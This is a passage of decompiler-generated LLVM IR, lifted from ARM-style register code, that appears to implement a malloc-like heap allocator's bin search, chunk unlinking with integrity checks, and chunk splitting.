  %v0_e3cc = load i32, i32* %r3.global-to-local, align 4
  %v1_e3cc = load i32, i32* %r1.global-to-local, align 4
  %v2_e3cc = add i32 %v1_e3cc, 820
  %v3_e3cc = inttoptr i32 %v2_e3cc to i32*
  store i32 %v0_e3cc, i32* %v3_e3cc, align 4
  %v0_e3d0 = load i32, i32* @r6, align 4
  %v1_e3d0 = load i32, i32* @lr, align 4
  %v2_e3d0 = add i32 %v1_e3d0, 12
  %v3_e3d0 = inttoptr i32 %v2_e3d0 to i32*
  store i32 %v0_e3d0, i32* %v3_e3d0, align 4
  %v0_e3d4 = load i32, i32* @r6, align 4
  %v1_e3d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_e3d4 = add i32 %v1_e3d4, 8
  %v3_e3d4 = inttoptr i32 %v2_e3d4 to i32*
  store i32 %v0_e3d4, i32* %v3_e3d4, align 4
  %v0_e3f0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e3dc:                                ; preds = %dec_label_pc_e27c, %dec_label_pc_e234, %dec_label_pc_e290
  store i32 68, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r1.global-to-local, align 4
  %v4_e3e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e3e4, i32* @sb, align 4
  %v0_e3e8 = load i32, i32* @sl, align 4
  %v1_e3e8 = add i32 %v0_e3e8, 16
  store i32 %v1_e3e8, i32* @fp, align 4
  %v1_e3ec = add i32 %v4_e3e4, 52
  store i32 %v1_e3ec, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e3f0

dec_label_pc_e3f0:                                ; preds = %dec_label_pc_e3a4, %dec_label_pc_e3dc
  %v0_e310 = phi i32 [ %v0_e3f0.pre, %dec_label_pc_e3a4 ], [ %v1_e3ec, %dec_label_pc_e3dc ]
  %v1_e3f0 = add i32 %v0_e310, 12
  %v2_e3f0 = inttoptr i32 %v1_e3f0 to i32*
  %v3_e3f0 = load i32, i32* %v2_e3f0, align 4
  store i32 %v3_e3f0, i32* @r6, align 4
  %v9_e3f4 = icmp eq i32 %v3_e3f0, %v0_e310
  br i1 %v9_e3f4, label %dec_label_pc_e3fc, label %dec_label_pc_e2a4

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3f0
  %v0_e3fc = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_e3fc, 256
  %v0_e4b4.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_e3fc.dec_label_pc_e4b4_crit_edge, label %dec_label_pc_e404

dec_label_pc_e3fc.dec_label_pc_e4b4_crit_edge:    ; preds = %dec_label_pc_e3fc
  %.pre200 = mul i32 %v0_e4b4.pre, 8
  br label %dec_label_pc_e4b4

dec_label_pc_e404:                                ; preds = %dec_label_pc_e3fc
  %v4_e404 = mul i32 %v0_e4b4.pre, 8
  %v5_e404 = add i32 %v4_e404, %v0_e310
  store i32 %v5_e404, i32* %r3.global-to-local, align 4
  %v1_e408 = add i32 %v5_e404, -8
  store i32 %v1_e408, i32* %r1.global-to-local, align 4
  %v1_e40c = add i32 %v5_e404, 4
  %v2_e40c = inttoptr i32 %v1_e40c to i32*
  %storemerge.pre = load i32, i32* %v2_e40c, align 4
  br label %dec_label_pc_e4ac

dec_label_pc_e414:                                ; preds = %dec_label_pc_e4ac
  %v1_e414 = add i32 %v1_e43c, 4
  %v2_e414 = inttoptr i32 %v1_e414 to i32*
  %v3_e414 = load i32, i32* %v2_e414, align 4
  store i32 %v3_e414, i32* %r3.global-to-local, align 4
  %v1_e418 = and i32 %v3_e414, -4
  store i32 %v1_e418, i32* %r2.global-to-local, align 4
  %v3_e41c = icmp ult i32 %v1_e418, %v0_e3fc
  %v1_e420 = add i32 %v1_e43c, 12
  %v2_e420 = inttoptr i32 %v1_e420 to i32*
  %v3_e420 = load i32, i32* %v2_e420, align 4
  store i32 %v3_e420, i32* %r0.global-to-local, align 4
  br i1 %v3_e41c, label %dec_label_pc_e4ac, label %dec_label_pc_e428

dec_label_pc_e428:                                ; preds = %dec_label_pc_e414
  %v1_e428 = add i32 %v1_e43c, 8
  %v2_e428 = inttoptr i32 %v1_e428 to i32*
  %v3_e428 = load i32, i32* %v2_e428, align 4
  store i32 %v3_e428, i32* %r1.global-to-local, align 4
  %v1_e42c = add i32 %v3_e428, 12
  %v2_e42c = inttoptr i32 %v1_e42c to i32*
  %v3_e42c = load i32, i32* %v2_e42c, align 4
  store i32 %v3_e42c, i32* %r3.global-to-local, align 4
  %v9_e430 = icmp eq i32 %v3_e42c, %v1_e43c
  br i1 %v9_e430, label %dec_label_pc_e438, label %dec_label_pc_e444

dec_label_pc_e438:                                ; preds = %dec_label_pc_e428
  %v1_e438 = add i32 %v3_e420, 8
  %v2_e438 = inttoptr i32 %v1_e438 to i32*
  %v3_e438 = load i32, i32* %v2_e438, align 4
  store i32 %v3_e438, i32* %r3.global-to-local, align 4
  %v9_e43c = icmp eq i32 %v3_e438, %v1_e43c
  br i1 %v9_e43c, label %dec_label_pc_e448, label %dec_label_pc_e444

dec_label_pc_e444:                                ; preds = %dec_label_pc_e428, %dec_label_pc_e438
  %v0_e444 = call i32 @abort()
  store i32 %v0_e444, i32* %r0.global-to-local, align 4
  %v0_e448.pre = load i32, i32* @sl, align 4
  %v1_e448.pre = load i32, i32* @r2, align 4
  %v0_e450.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e448

dec_label_pc_e448:                                ; preds = %dec_label_pc_e438, %dec_label_pc_e444
  %v1_e450 = phi i32 [ %v3_e420, %dec_label_pc_e438 ], [ %v0_e444, %dec_label_pc_e444 ]
  %v0_e450 = phi i32 [ %v3_e428, %dec_label_pc_e438 ], [ %v0_e450.pre, %dec_label_pc_e444 ]
  %v1_e448 = phi i32 [ %v1_e418, %dec_label_pc_e438 ], [ %v1_e448.pre, %dec_label_pc_e444 ]
  %v0_e448 = phi i32 [ %v0_e3fc, %dec_label_pc_e438 ], [ %v0_e448.pre, %dec_label_pc_e444 ]
  %v2_e448 = sub i32 %v1_e448, %v0_e448
  store i32 %v2_e448, i32* %lr.global-to-local, align 4
  %v2_e450 = add i32 %v1_e450, 8
  %v3_e450 = inttoptr i32 %v2_e450 to i32*
  store i32 %v0_e450, i32* %v3_e450, align 4
  %v0_e454 = load i32, i32* %r0.global-to-local, align 4
  %v1_e454 = load i32, i32* %r1.global-to-local, align 4
  %v2_e454 = add i32 %v1_e454, 12
  %v3_e454 = inttoptr i32 %v2_e454 to i32*
  store i32 %v0_e454, i32* %v3_e454, align 4
  %v0_e458 = load i32, i32* %ip.global-to-local, align 4
  %v1_e458 = add i32 %v0_e458, 8
  store i32 %v1_e458, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_e448, 15
  br i1 %tmp207, label %dec_label_pc_e478, label %dec_label_pc_e460

dec_label_pc_e460:                                ; preds = %dec_label_pc_e448
  %v1_e460 = load i32, i32* %r2.global-to-local, align 4
  %v2_e460 = add i32 %v1_e460, %v0_e458
  store i32 %v2_e460, i32* %r2.global-to-local, align 4
  %v1_e464 = add i32 %v2_e460, 4
  %v2_e464 = inttoptr i32 %v1_e464 to i32*
  %v3_e464 = load i32, i32* %v2_e464, align 4
  store i32 %v3_e464, i32* %r3.global-to-local, align 4
  store i32 %v1_e458, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e46c

dec_label_pc_e46c.loopexit:                       ; preds = %dec_label_pc_e30c
  %v1_e318 = load i32, i32* @r6, align 4
  %v2_e318 = load i32, i32* @sl, align 4
  %v3_e318 = add i32 %v2_e318, %v1_e318
  store i32 %v3_e318, i32* %r2.global-to-local, align 4
  %v2_e31c = add i32 %v3_e318, 4
  %v3_e31c = inttoptr i32 %v2_e31c to i32*
  %v4_e31c = load i32, i32* %v3_e31c, align 4
  store i32 %v4_e31c, i32* %r3.global-to-local, align 4
  %v2_e320 = add i32 %v1_e318, 8
  store i32 %v2_e320, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e46c

dec_label_pc_e46c:                                ; preds = %.dec_label_pc_e46c_crit_edge, %dec_label_pc_e46c.loopexit, %dec_label_pc_e460
  %v1_e470 = phi i32 [ %v4_e594, %.dec_label_pc_e46c_crit_edge ], [ %v3_e318, %dec_label_pc_e46c.loopexit ], [ %v2_e460, %dec_label_pc_e460 ]
  %v0_e46c = phi i32 [ %v7_e594, %.dec_label_pc_e46c_crit_edge ], [ %v4_e31c, %dec_label_pc_e46c.loopexit ], [ %v3_e464, %dec_label_pc_e460 ]
  %v1_e46c = or i32 %v0_e46c, 1
  store i32 %v1_e46c, i32* %r3.global-to-local, align 4
  %v2_e470 = add i32 %v1_e470, 4
  %v3_e470 = inttoptr i32 %v2_e470 to i32*
  store i32 %v1_e46c, i32* %v3_e470, align 4
  br label %dec_label_pc_ea34

dec_label_pc_e478:                                ; preds = %dec_label_pc_e448
  %v1_e478 = load i32, i32* @sl, align 4
  %v2_e478 = add i32 %v1_e478, %v0_e458
  store i32 %v2_e478, i32* %r2.global-to-local, align 4
  %v1_e47c = or i32 %v1_e478, 1
  store i32 %v1_e47c, i32* %r3.global-to-local, align 4
  %v0_e480 = load i32, i32* %lr.global-to-local, align 4
  %v1_e480 = or i32 %v0_e480, 1
  store i32 %v1_e480, i32* %r1.global-to-local, align 4
  store i32 %v1_e458, i32* %r4.global-to-local, align 4
  %v2_e488 = add i32 %v0_e458, 4
  %v3_e488 = inttoptr i32 %v2_e488 to i32*
  store i32 %v1_e47c, i32* %v3_e488, align 4
  %v0_e48c = load i32, i32* %r2.global-to-local, align 4
  %v1_e48c = load i32, i32* @r6, align 4
  %v2_e48c = add i32 %v1_e48c, 8
  %v3_e48c = inttoptr i32 %v2_e48c to i32*
  store i32 %v0_e48c, i32* %v3_e48c, align 4
  %v0_e490 = load i32, i32* %r2.global-to-local, align 4
  %v1_e490 = load i32, i32* @r6, align 4
  %v2_e490 = add i32 %v1_e490, 12
  %v3_e490 = inttoptr i32 %v2_e490 to i32*
  store i32 %v0_e490, i32* %v3_e490, align 4
  %v0_e494 = load i32, i32* %lr.global-to-local, align 4
  %v1_e494 = load i32, i32* %r2.global-to-local, align 4
  %v3_e494 = add i32 %v1_e494, %v0_e494
  %v4_e494 = inttoptr i32 %v3_e494 to i32*
  store i32 %v0_e494, i32* %v4_e494, align 4
  %v0_e498 = load i32, i32* %r1.global-to-local, align 4
  %v1_e498 = load i32, i32* %r2.global-to-local, align 4
  %v2_e498 = add i32 %v1_e498, 4
  %v3_e498 = inttoptr i32 %v2_e498 to i32*
  store i32 %v0_e498, i32* %v3_e498, align 4
  %v0_e49c = load i32, i32* @r6, align 4
  %v1_e49c = load i32, i32* %r2.global-to-local, align 4
  %v2_e49c = add i32 %v1_e49c, 12
  %v3_e49c = inttoptr i32 %v2_e49c to i32*
  store i32 %v0_e49c, i32* %v3_e49c, align 4
  %v0_e4a0 = load i32, i32* @r6, align 4
  %v1_e4a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_e4a0 = add i32 %v1_e4a0, 8
  %v3_e4a0 = inttoptr i32 %v2_e4a0 to i32*
  store i32 %v0_e4a0, i32* %v3_e4a0, align 4
  br label %dec_label_pc_ea34

dec_label_pc_e4ac:                                ; preds = %dec_label_pc_e414, %dec_label_pc_e404
  %v1_e43c = phi i32 [ %storemerge.pre, %dec_label_pc_e404 ], [ %v3_e420, %dec_label_pc_e414 ]
  store i32 %v1_e43c, i32* %ip.global-to-local, align 4
  %v9_e4ac = icmp eq i32 %v1_e43c, %v1_e408
  br i1 %v9_e4ac, label %dec_label_pc_e4b4.loopexit, label %dec_label_pc_e414

dec_label_pc_e4b4.loopexit:                       ; preds = %dec_label_pc_e4ac
  br label %dec_label_pc_e4b4

dec_label_pc_e4b4:                                ; preds = %dec_label_pc_e3fc.dec_label_pc_e4b4_crit_edge, %dec_label_pc_e4b4.loopexit
  %v4_e4e4.pre-phi = phi i32 [ %.pre200, %dec_label_pc_e3fc.dec_label_pc_e4b4_crit_edge ], [ %v4_e404, %dec_label_pc_e4b4.loopexit ]
  %v1_e4b4 = add i32 %v0_e4b4.pre, 1
  store i32 %v1_e4b4, i32* %r2.global-to-local, align 4
  %v1_e4b8 = urem i32 %v1_e4b4, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r0.global-to-local, align 4
  %v6_e4c4 = shl i32 1, %v1_e4b8
  store i32 %v6_e4c4, i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_e4cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e4cc, i32* %r3.global-to-local, align 4
  %v3_e4d0 = udiv i32 %v1_e4b4, 32
  store i32 %v3_e4d0, i32* @r5, align 4
  %v4_e4d4 = mul nuw nsw i32 %v3_e4d0, 4
  %v5_e4d4 = add i32 %v4_e4cc, %v4_e4d4
  store i32 %v5_e4d4, i32* %r2.global-to-local, align 4
  %v1_e4d8 = add i32 %v5_e4d4, 820
  %v2_e4d8 = inttoptr i32 %v1_e4d8 to i32*
  %v3_e4d8 = load i32, i32* %v2_e4d8, align 4
  store i32 %v3_e4d8, i32* @r4, align 4
  %v1_e4dc = add i32 %v4_e4cc, 52
  store i32 %v1_e4dc, i32* %r3.global-to-local, align 4
  store i32 68, i32* @r8, align 4
  %v5_e4e4 = add i32 %v1_e4dc, %v4_e4e4.pre-phi
  store i32 %v5_e4e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e4e8

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e550, %dec_label_pc_e4b4
  %v1_e4f0 = phi i32 [ %v1_e4f0.pre, %dec_label_pc_e550 ], [ %v3_e4d8, %dec_label_pc_e4b4 ]
  %v0_e4f0 = phi i32 [ %v0_e4e8.pre, %dec_label_pc_e550 ], [ %v6_e4c4, %dec_label_pc_e4b4 ]
  %v1_e4e8 = sub i32 1, %v0_e4f0
  %v2_e4e8 = icmp ult i32 %v0_e4f0, 2
  %v1_e4e8. = select i1 %v2_e4e8, i32 %v1_e4e8, i32 0
  store i32 %v1_e4e8., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_e4f0, %v1_e4f0
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_e4e8
  %v5_e4f4 = or i32 %v1_e4e8., 1
  store i32 %v5_e4f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e500.preheader

bb142:                                            ; preds = %dec_label_pc_e4e8
  %v2_e4f8 = icmp eq i32 %v1_e4e8., 0
  br i1 %v2_e4f8, label %.dec_label_pc_e53c.preheader_crit_edge, label %dec_label_pc_e500.preheader

.dec_label_pc_e53c.preheader_crit_edge:           ; preds = %bb142
  %v0_e53454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e53c.preheader

dec_label_pc_e500.preheader:                      ; preds = %bb142, %.thread12
  %v0_e500.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e500

dec_label_pc_e500:                                ; preds = %dec_label_pc_e500.preheader, %dec_label_pc_e50c
  %v0_e500 = phi i32 [ %v0_e500.pre, %dec_label_pc_e500.preheader ], [ %v1_e500, %dec_label_pc_e50c ]
  %v1_e500 = add i32 %v0_e500, 1
  store i32 %v1_e500, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_e500, 2
  br i1 %tmp208, label %dec_label_pc_e5e0.loopexit, label %dec_label_pc_e50c

dec_label_pc_e50c:                                ; preds = %dec_label_pc_e500
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r3.global-to-local, align 4
  %v1_e510 = load i32, i32* @r8, align 4
  %v2_e510 = add i32 %v1_e510, ptrtoint (i32* @global_var_24010.405 to i32)
  %v3_e510 = inttoptr i32 %v2_e510 to i32*
  %v4_e510 = load i32, i32* %v3_e510, align 4
  store i32 %v4_e510, i32* %r2.global-to-local, align 4
  %v4_e514 = mul i32 %v1_e500, 4
  %v5_e514 = add i32 %v4_e510, %v4_e514
  store i32 %v5_e514, i32* %r3.global-to-local, align 4
  %v1_e518 = add i32 %v5_e514, 820
  %v2_e518 = inttoptr i32 %v1_e518 to i32*
  %v3_e518 = load i32, i32* %v2_e518, align 4
  store i32 %v3_e518, i32* @r4, align 4
  %v2_e51c = icmp eq i32 %v3_e518, 0
  br i1 %v2_e51c, label %dec_label_pc_e500, label %dec_label_pc_e524

dec_label_pc_e524:                                ; preds = %dec_label_pc_e50c
  %v4_e524 = mul i32 %v1_e500, 256
  %v5_e524 = add i32 %v4_e510, %v4_e524
  store i32 %v5_e524, i32* %r3.global-to-local, align 4
  %v1_e528 = add i32 %v5_e524, 44
  store i32 %v1_e528, i32* %r0.global-to-local, align 4
  %v0_e52c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e52c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e53c.preheader

dec_label_pc_e53c.preheader:                      ; preds = %.dec_label_pc_e53c.preheader_crit_edge, %dec_label_pc_e524
  %v0_e53454 = phi i32 [ %v1_e528, %dec_label_pc_e524 ], [ %v0_e53454.pre, %.dec_label_pc_e53c.preheader_crit_edge ]
  %v0_e558 = phi i32 [ %v3_e518, %dec_label_pc_e524 ], [ %v1_e4f0, %.dec_label_pc_e53c.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_e52c, %dec_label_pc_e524 ], [ %v0_e4f0, %.dec_label_pc_e53c.preheader_crit_edge ]
  %v2_e53c51 = and i32 %ip.promoted, %v0_e558
  %v4_e53c53 = icmp eq i32 %v2_e53c51, 0
  br i1 %v4_e53c53, label %dec_label_pc_e534, label %dec_label_pc_e544

dec_label_pc_e534:                                ; preds = %dec_label_pc_e53c.preheader, %dec_label_pc_e534
  %v2_e53856 = phi i32 [ %v2_e538, %dec_label_pc_e534 ], [ %ip.promoted, %dec_label_pc_e53c.preheader ]
  %v0_e53455 = phi i32 [ %v1_e534, %dec_label_pc_e534 ], [ %v0_e53454, %dec_label_pc_e53c.preheader ]
  %v1_e534 = add i32 %v0_e53455, 8
  %v2_e538 = mul i32 %v2_e53856, 2
  %v2_e53c = and i32 %v2_e538, %v0_e558
  %v4_e53c = icmp eq i32 %v2_e53c, 0
  br i1 %v4_e53c, label %dec_label_pc_e534, label %dec_label_pc_e53c.dec_label_pc_e544_crit_edge

dec_label_pc_e53c.dec_label_pc_e544_crit_edge:    ; preds = %dec_label_pc_e534
  store i32 %v1_e534, i32* %r0.global-to-local, align 4
  store i32 %v2_e538, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e544

dec_label_pc_e544:                                ; preds = %dec_label_pc_e53c.dec_label_pc_e544_crit_edge, %dec_label_pc_e53c.preheader
  %v0_e564 = phi i32 [ %v2_e538, %dec_label_pc_e53c.dec_label_pc_e544_crit_edge ], [ %ip.promoted, %dec_label_pc_e53c.preheader ]
  %v0_e588 = phi i32 [ %v1_e534, %dec_label_pc_e53c.dec_label_pc_e544_crit_edge ], [ %v0_e53454, %dec_label_pc_e53c.preheader ]
  %v1_e544 = add i32 %v0_e588, 12
  %v2_e544 = inttoptr i32 %v1_e544 to i32*
  %v3_e544 = load i32, i32* %v2_e544, align 4
  store i32 %v3_e544, i32* @lr, align 4
  %v9_e548 = icmp eq i32 %v3_e544, %v0_e588
  br i1 %v9_e548, label %dec_label_pc_e550, label %dec_label_pc_e570

dec_label_pc_e550:                                ; preds = %dec_label_pc_e544
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r0.global-to-local, align 4
  %v1_e554 = load i32, i32* @r8, align 4
  %v2_e554 = add i32 %v1_e554, ptrtoint (i32* @global_var_24010.405 to i32)
  %v3_e554 = inttoptr i32 %v2_e554 to i32*
  %v4_e554 = load i32, i32* %v3_e554, align 4
  %v2_e558 = sub i32 -1, %v0_e564
  %v3_e558 = and i32 %v0_e558, %v2_e558
  store i32 %v3_e558, i32* @r4, align 4
  %v1_e55c = load i32, i32* @r5, align 4
  %v4_e55c = mul i32 %v1_e55c, 4
  %v5_e55c = add i32 %v4_e55c, %v4_e554
  store i32 %v5_e55c, i32* %r3.global-to-local, align 4
  %v1_e560 = add i32 %v0_e588, 8
  store i32 %v1_e560, i32* %r0.global-to-local, align 4
  %v2_e564 = mul i32 %v0_e564, 2
  store i32 %v2_e564, i32* %ip.global-to-local, align 4
  %v2_e568 = add i32 %v5_e55c, 820
  %v3_e568 = inttoptr i32 %v2_e568 to i32*
  store i32 %v3_e558, i32* %v3_e568, align 4
  %v0_e4e8.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_e4f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e4e8

dec_label_pc_e570:                                ; preds = %dec_label_pc_e544
  %v1_e570 = add i32 %v3_e544, 4
  %v2_e570 = inttoptr i32 %v1_e570 to i32*
  %v3_e570 = load i32, i32* %v2_e570, align 4
  store i32 %v3_e570, i32* %r3.global-to-local, align 4
  %v1_e574 = and i32 %v3_e570, -4
  store i32 %v1_e574, i32* %r2.global-to-local, align 4
  %v0_e578 = load i32, i32* @sl, align 4
  %v2_e578 = sub i32 %v1_e574, %v0_e578
  store i32 %v2_e578, i32* %ip.global-to-local, align 4
  %v1_e57c = add i32 %v3_e544, 12
  %v2_e57c = inttoptr i32 %v1_e57c to i32*
  %v3_e57c = load i32, i32* %v2_e57c, align 4
  store i32 %v3_e57c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_e578, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_e570
  %v6_e584 = add i32 %v1_e574, %v3_e544
  store i32 %v6_e584, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_e570, %bb143
  %v2_e588 = add i32 %v3_e57c, 8
  %v3_e588 = inttoptr i32 %v2_e588 to i32*
  store i32 %v0_e588, i32* %v3_e588, align 4
  %v0_e58c = load i32, i32* %r3.global-to-local, align 4
  %v1_e58c = load i32, i32* %r0.global-to-local, align 4
  %v2_e58c = add i32 %v1_e58c, 12
  %v3_e58c = inttoptr i32 %v2_e58c to i32*
  store i32 %v0_e58c, i32* %v3_e58c, align 4
  %v4_e590 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_e46c_crit_edge, label %dec_label_pc_e59c

.dec_label_pc_e46c_crit_edge:                     ; preds = %bb144
  %v5_e590 = add i32 %v4_e590, 8
  store i32 %v5_e590, i32* %r4.global-to-local, align 4
  %v4_e594 = load i32, i32* %r2.global-to-local, align 4
  %v5_e594 = add i32 %v4_e594, 4
  %v6_e594 = inttoptr i32 %v5_e594 to i32*
  %v7_e594 = load i32, i32* %v6_e594, align 4
  store i32 %v7_e594, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e46c

dec_label_pc_e59c:                                ; preds = %bb144
  %v1_e59c = load i32, i32* @sl, align 4
  %v2_e59c = add i32 %v1_e59c, %v4_e590
  store i32 %v2_e59c, i32* %r1.global-to-local, align 4
  %v1_e5a4 = load i32, i32* @r6, align 4
  %v2_e5a4 = add i32 %v1_e5a4, 8
  %v3_e5a4 = inttoptr i32 %v2_e5a4 to i32*
  store i32 %v2_e59c, i32* %v3_e5a4, align 4
  %v0_e5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e5a8 = load i32, i32* @r6, align 4
  %v2_e5a8 = add i32 %v1_e5a8, 12
  %v3_e5a8 = inttoptr i32 %v2_e5a8 to i32*
  store i32 %v0_e5a8, i32* %v3_e5a8, align 4
  %v0_e5ac = load i32, i32* @r6, align 4
  %v1_e5ac = load i32, i32* %r1.global-to-local, align 4
  %v2_e5ac = add i32 %v1_e5ac, 8
  %v3_e5ac = inttoptr i32 %v2_e5ac to i32*
  store i32 %v0_e5ac, i32* %v3_e5ac, align 4
  %v0_e5b0 = load i32, i32* @r6, align 4
  %v1_e5b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_e5b0 = add i32 %v1_e5b0, 12
  %v3_e5b0 = inttoptr i32 %v2_e5b0 to i32*
  store i32 %v0_e5b0, i32* %v3_e5b0, align 4
  %tmp210 = icmp ult i32 %v1_e59c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_e59c
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v8_e5bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v8_e5bc, i32* %r3.global-to-local, align 4
  %v4_e5c0 = load i32, i32* %r1.global-to-local, align 4
  %v6_e5c0 = add i32 %v8_e5bc, 48
  %v7_e5c0 = inttoptr i32 %v6_e5c0 to i32*
  store i32 %v4_e5c0, i32* %v7_e5c0, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_e59c, %bb145
  %v0_e5c4 = load i32, i32* @sl, align 4
  %v1_e5c4 = or i32 %v0_e5c4, 1
  store i32 %v1_e5c4, i32* %r2.global-to-local, align 4
  %v0_e5c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_e5c8 = or i32 %v0_e5c8, 1
  store i32 %v1_e5c8, i32* %r3.global-to-local, align 4
  %v0_e5cc = load i32, i32* @lr, align 4
  %v1_e5cc = add i32 %v0_e5cc, 8
  store i32 %v1_e5cc, i32* %r4.global-to-local, align 4
  %v2_e5d0 = add i32 %v0_e5cc, 4
  %v3_e5d0 = inttoptr i32 %v2_e5d0 to i32*
  store i32 %v1_e5c4, i32* %v3_e5d0, align 4
  %v0_e5d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e5d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e5d4 = add i32 %v1_e5d4, %v0_e5d4
  %v4_e5d4 = inttoptr i32 %v3_e5d4 to i32*
  store i32 %v0_e5d4, i32* %v4_e5d4, align 4
  %v0_e5d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e5d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_e5d8 = add i32 %v1_e5d8, 4
  %v3_e5d8 = inttoptr i32 %v2_e5d8 to i32*
  store i32 %v0_e5d8, i32* %v3_e5d8, align 4
  br label %dec_label_pc_ea34

dec_label_pc_e5e0.loopexit:                       ; preds = %dec_label_pc_e500
  br label %dec_label_pc_e5e0

dec_label_pc_e5e0:                                ; preds = %dec_label_pc_e5e0.loopexit, %dec_label_pc_e1f4, %dec_label_pc_e1fc
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  %v4_e5e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e5e8, i32* @r0, align 4
  %v1_e5ec = add i32 %v4_e5e8, 44
  %v2_e5ec = inttoptr i32 %v1_e5ec to i32*
  %v3_e5ec = load i32, i32* %v2_e5ec, align 4
  store i32 %v3_e5ec, i32* %ip.global-to-local, align 4
  %v1_e5f0 = add i32 %v3_e5ec, 4
  %v2_e5f0 = inttoptr i32 %v1_e5f0 to i32*
  %v3_e5f0 = load i32, i32* %v2_e5f0, align 4
  %v0_e5f4 = load i32, i32* @sl, align 4
  %v1_e5f4 = add i32 %v0_e5f4, 16
  store i32 %v1_e5f4, i32* %r1.global-to-local, align 4
  %v1_e5f8 = and i32 %v3_e5f0, -4
  store i32 %v1_e5f8, i32* %r3.global-to-local, align 4
  %v3_e5fc = icmp ult i32 %v1_e5f8, %v1_e5f4
  br i1 %v3_e5fc, label %dec_label_pc_e62c, label %dec_label_pc_e608

dec_label_pc_e608:                                ; preds = %dec_label_pc_e5e0
  %v2_e608 = sub i32 %v1_e5f8, %v0_e5f4
  %v2_e60c = add i32 %v0_e5f4, %v3_e5ec
  store i32 %v2_e60c, i32* %r1.global-to-local, align 4
  %v1_e610 = or i32 %v2_e608, 1
  store i32 %v1_e610, i32* %r3.global-to-local, align 4
  %v1_e614 = or i32 %v0_e5f4, 1
  store i32 %v1_e614, i32* %r2.global-to-local, align 4
  %v1_e618 = add i32 %v3_e5ec, 8
  store i32 %v1_e618, i32* %r4.global-to-local, align 4
  store i32 %v1_e614, i32* %v2_e5f0, align 4
  %v0_e620 = load i32, i32* %r1.global-to-local, align 4
  %v1_e620 = load i32, i32* @r0, align 4
  %v2_e620 = add i32 %v1_e620, 44
  %v3_e620 = inttoptr i32 %v2_e620 to i32*
  store i32 %v0_e620, i32* %v3_e620, align 4
  %v0_e624 = load i32, i32* %r3.global-to-local, align 4
  %v1_e624 = load i32, i32* %r1.global-to-local, align 4
  %v2_e624 = add i32 %v1_e624, 4
  %v3_e624 = inttoptr i32 %v2_e624 to i32*
  store i32 %v0_e624, i32* %v3_e624, align 4
  br label %dec_label_pc_ea34

dec_label_pc_e62c:                                ; preds = %dec_label_pc_e5e0
  %v1_e62c = inttoptr i32 %v4_e5e8 to i32*
  %v2_e62c = load i32, i32* %v1_e62c, align 4
  store i32 %v2_e62c, i32* %r3.global-to-local, align 4
  %v1_e630 = and i32 %v2_e62c, 2
  store i32 %v1_e630, i32* %ip.global-to-local, align 4
  %v2_e630 = icmp eq i32 %v1_e630, 0
  %v1_e634 = add i32 %v4_e5e8, 860
  %v2_e634 = inttoptr i32 %v1_e634 to i32*
  %v3_e634 = load i32, i32* %v2_e634, align 4
  store i32 %v3_e634, i32* %r1.global-to-local, align 4
